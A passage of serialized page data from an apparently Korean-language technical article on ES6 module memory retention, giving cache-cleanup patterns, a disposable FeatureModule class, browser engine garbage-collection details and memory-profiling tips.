function\",\"children\":\"clearCache\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"32\",\"children\":[\"  cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"clear\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"33\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"34\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"35\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 4. WeakMap 활용 (객체 키만 가능)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"36\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" weakCache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"WeakMap\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"37\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processWithWeakMap\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":[\"obj\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\"]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"38\",\"children\":[\"  weakCache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"set\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"obj\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// obj가 GC되면 자동 정리\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"39\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processData\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"40\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-핵심-교훈\",\"children\":\"🎯 핵심 교훈\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":[\"ES6 모듈에서 \",[\"$\",\"code\",null,{\"children\":\"Map\"}],\", \",[\"$\",\"code\",null,{\"children\":\"Set\"}],\", \",[\"$\",\"code\",null,{\"children\":\"Array\"}],\" 등을 모듈 스코프에 선언할 때는 반드시:\"]}]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"✅ 크기 제한 구현\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"✅ TTL 메커니즘 추가\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"✅ 명시적 정리 함수 제공\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"✅ 가능하면 WeakMap/WeakSet 사용 고려\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 스코프 이벤트 리스너는 특히 교활한 누수 패턴을 나타냅니다. 모듈이 지속되므로, 모듈 스코프에서 연결된 모든 이벤트 리스너는 애플리케이션의 생명주기 동안 활성 상태로 남아있어, 잠재적으로 큰 객체나 DOM 요소에 대한 참조를 보유할 수 있습니다.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"실용적-영향\",\"children\":\"실용적 영향\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈이-실제로-가비지-컬렉션되는-경우-vs-지속되는-경우\",\"children\":\"모듈이 실제로 가비지 컬렉션되는 경우 vs 지속되는 경우\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"가혹한 현실: \",[\"$\",\"strong\",null,{\"children\":\"ES6 모듈은 JavaScript 영역의 생명주기 동안 개별적으로 가비지 컬렉션되지 않습니다\"}],\". 동적 import조차도 식별자별로 영구적으로 캐시됩니다. 이는 누적된 모듈 참조가 상당한 메모리 증가를 야기할 수 있는 장시간 실행 애플리케이션에 깊은 영향을 미칩니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"단일 페이지 애플리케이션의 경우, 라우트 기반 동적 import가 시간이 지나면서 정리 없이 누적됩니다. 모듈 스코프 클로저는 큰 객체에 대한 참조를 무한정 보유합니다. 실제 정리는 페이지 이동에서만 발생하므로, 사용자가 장시간 열어두는 애플리케이션에서는 메모리 관리가 중요해집니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"spa-컨텍스트와-모듈-메모리-동작\",\"children\":\"SPA 컨텍스트와 모듈 메모리 동작\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"개발 환경에서 핫 모듈 교체(Hot Module Replacement, HMR)는 추가적인 메모리 문제를 야기합니다. Webpack의 HMR은 모듈 교체 시 이전 모듈 참조를 완전히 정리하지 못해 여러 재로드 사이클에 걸쳐 메모리가 누적됩니다. Vite의 네이티브 ESM 접근법이 더 깨끗한 HMR을 제공하지만, ES6 모듈의 근본적인 지속성 특성은 여전히 남아있습니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 페더레이션은 공유 모듈이 복잡한 참조 체인을 만드는 추가적인 복잡성을 도입합니다. 원격 진입점은 애플리케이션 생명주기 동안 지속되고, 버전 불일치는 중복 모듈 로딩을 야기하여 메모리 사용량을 더욱 증가시킬 수 있습니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"메모리-관리를-위한-모범-사례\",\"children\":\"메모리 관리를 위한 모범 사례\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"효과적인 메모리 관리에는 명시적 생명주기 패턴이 필요합니다:\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"class\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"FeatureModule\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"constructor\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"resources\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"listeners\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"disposed\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"false\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"initialize\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"disposed\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"throw\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Error\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'Module disposed'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 정리 추적과 함께 리소스 설정\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function-variable function\",\"children\":\"handler\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"e\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"handleEvent\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"document\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"addEventListener\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'app:event'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" handler\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"listeners\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"push\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"document\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"removeEventListener\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'app:event'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" handler\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"17\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"18\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"dispose\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"19\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"disposed\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"true\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"20\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"resources\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"clear\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"21\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"listeners\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"forEach\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"cleanup\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"cleanup\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"22\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"listeners\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"length\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"23\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"24\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"큰 데이터를 관리할 때는 영구적 캐싱을 피하기 위해 JSON 모듈 import보다 \",[\"$\",\"code\",null,{\"children\":\"fetch()\"}],\"를 선호하세요. 가비지 컬렉션을 허용하는 객체 연관에는 WeakMap과 WeakSet을 사용하세요. 새로운 객체를 만들기보다는 객체를 재사용하는 리소스 풀링을 구현하세요.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"실제-시나리오와-사례-연구\",\"children\":\"실제 시나리오와 사례 연구\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"2020년 Meta의 Facebook.com 재설계는 중요한 모듈 메모리 문제를 드러냈습니다. 모듈 스코프에서 캐시된 React 컴포넌트가 연쇄적인 메모리 누수를 야기했고, 단일 컴포넌트 누수가 전체 Fiber 트리와 DOM 요소를 유지했습니다. 이는 언마운트된 컴포넌트에 대한 React 18의 공격적인 정리 순회로 이어졌습니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"프로덕션 모듈 페더레이션 배포는 공유 종속성의 여러 버전이 동시에 로드되는 메모리 증가 패턴을 보여주었습니다. 해결책에는 페더레이션 구성에서 엄격한 싱글톤 강제와 신중한 버전 관리가 포함됩니다.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"브라우저-구현-세부사항\",\"children\":\"브라우저 구현 세부사항\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"다양한-브라우저의-모듈-메모리-처리-방식\",\"children\":\"다양한 브라우저의 모듈 메모리 처리 방식\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"Chrome V8\"}],\"은 64비트 시스템에서 메모리 효율성을 위해 압축된 32비트 포인터를 사용합니다. 모듈 바이트코드와 메타데이터는 오래된 세대 힙에 저장되며, 모듈 네임스페이스 객체는 무한정 캐시됩니다. 엔진의 Orinoco 가비지 컬렉터는 일시 정지 시간을 최소화하기 위해 동시 마킹과 증분적 스위핑을 사용합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"Firefox SpiderMonkey\"}],\"는 독립적인 힙 파티션 수집을 허용하는 zone 기반 수집을 구현합니다. 하지만 모듈 상호 연결은 일반적으로 zone에 걸쳐 있어 이 최적화를 제한합니다. 엔진은 V8보다 더 공격적인 증분적 수집을 사용하여 작업을 더 작은 슬라이스로 나눕니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"Safari JavaScriptCore\"}],\"는 WebCore 객체에 대한 참조 카운팅과 JavaScript 객체에 대한 보수적 가비지 컬렉션을 결합합니다. 보수적 GC는 힙 객체를 가리키는 스택 주소를 루트로 취급하여, 필요한 것보다 잠재적으로 더 많은 객체를 살려둘 수 있지만 안전성 보장을 제공합니다.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-레지스트리-내부와-구현\",\"children\":\"모듈 레지스트리 내부와 구현\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"모든 브라우저는 모듈 식별자를 키로 사용하는 해시 맵으로 모듈 레지스트리를 구현합니다. V8의 구현에는 일관된 동작을 보장하는 명시적 상태 열거형(\",[\"$\",\"code\",null,{\"children\":\"kUninstantiated\"}],\", \",[\"$\",\"code\",null,{\"children\":\"kInstantiating\"}],\", \",[\"$\",\"code\",null,{\"children\":\"kInstantiated\"}],\", \",[\"$\",\"code\",null,{\"children\":\"kEvaluating\"}],\", \",[\"$\",\"code\",null,{\"children\":\"kEvaluated\"}],\", \",[\"$\",\"code\",null,{\"children\":\"kErrored\"}],\")과 결정적 해결이 포함됩니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 네임스페이스 객체는 특수한 속성 해결 의미론을 가진 이국적 객체로 구현됩니다. 원래 모듈 export에 대한 라이브 바인딩을 유지하고, 생성 후 불변 구조를 가지며, 속성 접근이 실제 export 값에 위임되는 프록시 같은 동작을 보입니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-메모리-사용량-디버깅과-프로파일링\",\"children\":\"모듈 메모리 사용량 디버깅과 프로파일링\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Chrome DevTools는 포괄적인 메모리 프로파일링을 제공합니다:\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 힙 스냅샷에서 모듈 식별하기\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1. \\\"Script\\\" 객체 찾기 (모듈 소스 코드)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 2. \\\"(compiled code)\\\" 객체 찾기 (JIT 출력)  \"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 3. export 속성으로 모듈 네임스페이스 객체 검색\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 4. 모듈 레지스트리를 통한 유지 경로 추적\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"자동화된 테스트를 위해 가능한 곳에서 Memory API를 활용하세요:\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"async\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"measureModuleMemoryImpact\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" before \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"performance\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"measureUserAgentSpecificMemory\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword 